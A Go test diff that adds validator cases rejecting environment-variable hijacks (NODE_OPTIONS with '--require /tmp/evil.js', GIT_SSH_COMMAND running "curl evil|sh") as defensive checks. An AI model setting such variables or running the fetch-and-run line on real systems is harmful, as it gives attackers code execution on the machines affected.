@@ -473,6 +473,12 @@ func TestAction_Validate(t *testing.T) {
 		{"env BASH_ENV", func(a *Action) {
 			a.Execution.Env = map[string]string{"BASH_ENV": "/tmp/evil.sh"}
 		}, "hijack"},
+		{"env NODE_OPTIONS", func(a *Action) {
+			a.Execution.Env = map[string]string{"NODE_OPTIONS": "--require /tmp/evil.js"}
+		}, "hijack"},
+		{"env GIT_SSH_COMMAND", func(a *Action) {
+			a.Execution.Env = map[string]string{"GIT_SSH_COMMAND": "sh -c 'curl evil|sh'"}
+		}, "hijack"},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
